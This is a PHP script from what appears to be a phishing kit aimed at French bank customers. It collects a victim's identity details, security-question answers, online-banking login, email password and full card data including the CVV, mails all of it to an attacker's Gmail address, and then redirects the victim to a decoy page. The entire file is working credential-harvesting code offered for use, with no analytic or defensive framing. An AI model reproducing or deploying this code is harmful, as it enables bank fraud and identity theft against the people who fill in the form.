<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "==========Edited===By===Joe==========\n";
$message .= "CivilitE       : ".$_POST['civ']."\n";
$message .= "Nom             : ".$_POST['nom']."\n";
$message .= "Prenom          : ".$_POST['prenom']."\n";
$message .= "Adresse         : ".$_POST['adresse']."\n";
$message .= "ville           :".$_POST['ville']."\n";
$message .= "Code postal     : ".$_POST['cp']."\n";
$message .= "Telephone       : ".$_POST['NEG2']."\n";
$message .= "DOB             : ".$_POST['dob1']."/".$_POST['dob2']."/".$_POST['dob3']."\n";
$message .= "Dép DOb         : ".$_POST['DEP']."\n";
$message .= "==========Edited===By===Joe==========\n";
$message .= "Rue grandi      : ".$_POST['reponses']."\n";
$message .= "Ami d'enfance   : ".$_POST['reponses2']."\n";
$message .= "==========Edited===By===Joe==========\n";
$message .= "Sa mére LCL     : ".$_POST['reponseslcl']."\n";
$message .= "Son Pére LCL    : ".$_POST['reponseslcl2']."\n";
$message .= "==========Edited===By===Joe==========\n";
$message .= "Banque Distance : ".$_POST['ibad']."\n";
$message .= "==========Edited===By===Joe==========\n";
$message .= "email secours   : ".$_POST['em']."\n";
$message .= "pass            : ".$_POST['pss']."\n";
$message .= "==========Edited===By===Joe==========\n";
$message .= "Nom de la banque: ".$_POST['bank']."\n";
$message .= "num de compte   : ".$_POST['account']."\n";
$message .= "Code Client     : ".$_POST['sgclient']."\n";
$message .= "Carte de credit : ".$_POST['ccnum']."\n";
$message .= "Date expiration : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "Cvv             : ".$_POST['cvv']."\n";
$message .= "==========Edited===By===Joe==========\n";
$message .= "IP Address: $ip\n";
$message .= "HostName  : $hostname\n";

$send="rezults88@gmail.com";

$subject = $_POST['bank']." |** $ip **|".$_POST['ccnum'];
$headers = "From: RezulT'<ghxcom10@gmail.com>";

mail($send,$subject,$message,$headers);

header("Location: redirections.html?Session=16514a36411d414c5s46cs6s5c4cs&encrypted_data=564612321687486654654687987653621354687686100000354687861533484313");

?>